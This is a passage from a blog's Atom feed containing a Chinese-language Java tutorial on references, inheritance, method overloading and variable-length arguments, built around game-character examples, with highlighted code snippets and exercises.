punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"*x^"</span><span class="token operator">+</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" + "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="信安数学基础C语言代码" scheme="http://www.blog.yln956.top/categories/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81/"/>
    
    
    <category term="学习" scheme="http://www.blog.yln956.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="C语言" scheme="http://www.blog.yln956.top/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>java学习</title>
    <link href="http://www.blog.yln956.top/2020/11/28/java%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.blog.yln956.top/2020/11/28/java%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-11-28T15:48:14.000Z</published>
    <updated>2020-12-13T15:44:16.507Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><h4 id="引用和指向"><a href="#引用和指向" class="headerlink" title="引用和指向"></a>引用和指向</h4><p><code>new Hero();</code></p><p> 代表<strong>创建</strong>了一个Hero对象<br>但是也仅仅是创建了一个对象，没有办法访问它<br>为了访问这个对象，会使用<strong>引用</strong>来<strong>代表</strong>这个对象</p><p><code>Hero h = new Hero();</code><br>h这个变量是Hero类型，又叫做引用<br>=的意思指的h这个引用<strong>代表</strong>右侧创建的对象<br>“<strong>代表</strong>” 在面向对象里，又叫做“<strong>指向</strong>”</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/1.png" alt="1" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>         <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>         <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>         <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//创建一个对象</span>        <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//使用一个引用来指向这个对象</span>        <span class="token class-name">Hero</span> h <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="一个对象，多个引用"><a href="#一个对象，多个引用" class="headerlink" title="一个对象，多个引用"></a>一个对象，多个引用</h4><p>引用有多个，但是对象只有一个。<br>在这个例子里，所有引用都指向了同一个对象。<br>对象就像 “一个人”， 引用就像”身份证”<br>身份证证的复印件可以有多张，但是真正的”人” 只有这么一个</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/617.jpg" alt="617" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>         <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>         <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>         <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//使用一个引用来指向这个对象</span>        <span class="token class-name">Hero</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hero</span> h2 <span class="token operator">=</span> h1<span class="token punctuation">;</span>  <span class="token comment">//h2指向h1所指向的对象</span>        <span class="token class-name">Hero</span> h3 <span class="token operator">=</span> h1<span class="token punctuation">;</span>        <span class="token class-name">Hero</span> h4 <span class="token operator">=</span> h1<span class="token punctuation">;</span>        <span class="token class-name">Hero</span> h5 <span class="token operator">=</span> h4<span class="token punctuation">;</span>                <span class="token comment">//h1,h2,h3,h4,h5 五个引用，都指向同一个对象</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="一个引用，多个对象"><a href="#一个引用，多个对象" class="headerlink" title="一个引用，多个对象"></a>一个引用，多个对象</h4><p>第8行，引用garen指向新创建的对象（对象1）<br>第9行，同一个引用garen指向新创建的对象（对象2）<br>这个时候，对象1，就没有任何引用指向了<br>换句话说，就没有任何手段控制和访问该对象，那么该对象就变得没有意义。</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/619.jpg" alt="619" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token keyword">protected</span> <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token class-name">Hero</span> garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>如代码，问题:<br>h4所指向的对象和h2所指向的对象，是否是同一个对象？</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>     <span class="token keyword">protected</span> <span class="token keyword">float</span> hp<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">Hero</span> h1 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h2 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h3<span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h4<span class="token punctuation">;</span>           h3 <span class="token operator">=</span> h1<span class="token punctuation">;</span>           h4 <span class="token operator">=</span> h3<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><p>不是同一个对象,h1,h3,h4为同一个对象，h2为另一个对象</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">float</span> hp<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">Hero</span> h1 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h2 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h3<span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h4<span class="token punctuation">;</span>           h3 <span class="token operator">=</span> h1<span class="token punctuation">;</span>           h4 <span class="token operator">=</span> h3<span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"h4的地址为："</span> <span class="token operator">+</span> h4<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"h3的地址为："</span> <span class="token operator">+</span> h3<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"h2的地址为："</span> <span class="token operator">+</span> h2<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"h1的地址为："</span> <span class="token operator">+</span> h1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/image-20201129003226218.png" alt="image-20201129003226218" loading="lazy"></p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="不继承"><a href="#不继承" class="headerlink" title="不继承"></a>不继承</h4><p>物品类有名称，价格属性</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Item</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">int</span> price<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>武器类： Weapon<strong>不继承Item</strong>的写法<br>独立设计 name和price属性<br>同时多了一个属性 damage 攻击力</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Weapon</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">int</span> price<span class="token punctuation">;</span>    <span class="token keyword">int</span> damage<span class="token punctuation">;</span> <span class="token comment">//攻击力</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="继承-1"><a href="#继承-1" class="headerlink" title="继承"></a>继承</h4><p>这一次Weapon<strong>继承Item</strong><br>虽然Weapon自己没有设计name和price,但是通过继承Item类，也具备了name和price属性</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Weapon</span> <span class="token keyword">extends</span> <span class="token class-name">Item</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> damage<span class="token punctuation">;</span> <span class="token comment">//攻击力</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Weapon</span> infinityEdge <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Weapon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        infinityEdge<span class="token punctuation">.</span>damage <span class="token operator">=</span> <span class="token number">65</span><span class="token punctuation">;</span> <span class="token comment">//damage属性在类Weapon中新设计的</span>                 infinityEdge<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"无尽之刃"</span><span class="token punctuation">;</span><span class="token comment">//name属性，是从Item中继承来的，就不需要重复设计了</span>        infinityEdge<span class="token punctuation">.</span>price <span class="token operator">=</span> <span class="token number">3600</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h4><p>设计一个类Armor护甲<br>继承Item类，并且额外提供一个属性ac: 护甲等级 int类型</p><p>实例化出两件护甲<br>名称 价格 护甲等级<br>布甲 300 15<br>锁子甲 500 40</p><h4 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Item</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> name<span class="token punctuation">;</span>      <span class="token keyword">int</span> prize<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Armor</span> <span class="token keyword">extends</span> <span class="token class-name">Item</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> level<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Armor</span> armor1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Armor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Armor</span> armor2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Armor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        armor1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"布甲"</span><span class="token punctuation">;</span>        armor2<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"锁子甲"</span><span class="token punctuation">;</span>        armor1<span class="token punctuation">.</span>prize <span class="token operator">=</span> <span class="token number">300</span><span class="token punctuation">;</span>        armor2<span class="token punctuation">.</span>prize <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>        armor1<span class="token punctuation">.</span>level<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">;</span>        armor2<span class="token punctuation">.</span>level<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>armor1<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"的价格为："</span><span class="token operator">+</span>armor1<span class="token punctuation">.</span>prize<span class="token operator">+</span><span class="token string">",等级为："</span><span class="token operator">+</span>armor1<span class="token punctuation">.</span>level<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>armor2<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"的价格为："</span><span class="token operator">+</span>armor2<span class="token punctuation">.</span>prize<span class="token operator">+</span><span class="token string">",等级为："</span><span class="token operator">+</span>armor2<span class="token punctuation">.</span>level<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><h4 id="attack方法的重载"><a href="#attack方法的重载" class="headerlink" title="attack方法的重载"></a>attack方法的重载</h4><p>方法重载即方法的方法名相同，但参数类型不一样</p><p>比如物理攻击英雄叫做ADHero</p><p>为ADHero 提供三种方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">,</span> <span class="token class-name">Hero</span> h2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方法名是一样的，但是参数类型不一样<br>在调用方法attack的时候，会根据传递的参数类型以及数量，自动调用对应的方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ADHero</span> <span class="token keyword">extends</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" 进行了一次攻击 ，但是不确定打中谁了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"对"</span> <span class="token operator">+</span> h1<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"进行了一次攻击 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">,</span> <span class="token class-name">Hero</span> h2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"同时对"</span> <span class="token operator">+</span> h1<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"和"</span> <span class="token operator">+</span> h2<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"进行了攻击 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ADHero</span> bh <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ADHero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bh<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"赏金猎人"</span><span class="token punctuation">;</span>         <span class="token class-name">Hero</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        h1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"盖伦"</span><span class="token punctuation">;</span>        <span class="token class-name">Hero</span> h2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        h2<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"提莫"</span><span class="token punctuation">;</span>         bh<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span>        bh<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span> h2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/590.png" alt="590" loading="lazy"></p><h4 id="可变数量的参数"><a href="#可变数量的参数" class="headerlink" title="可变数量的参数"></a>可变数量的参数</h4><p>如果要攻击更多的英雄，就需要设计更多的方法，这样类会显得很累赘，像这样：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">,</span> <span class="token class-name">Hero</span> h2<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">,</span> <span class="token class-name">Hero</span> h2<span class="token punctuation">,</span> <span class="token class-name">Hero</span> h3<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时，可以采用可变数量的参数<br><strong>只需要设计一个方法</strong><br><code>public void attack(Hero **...**heros)</code><br>即可代表上述所有的方法了<br>在方法里，使用操作数组的方式处理参数heros即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ADHero</span> <span class="token keyword">extends</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" 进行了一次攻击 ，但是不确定打中谁了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// 可变数量的参数</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> heros<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> heros<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" 攻击了 "</span> <span class="token operator">+</span> heros<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ADHero</span> bh <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ADHero</span><span class="token punctuation">(</span><span class="token 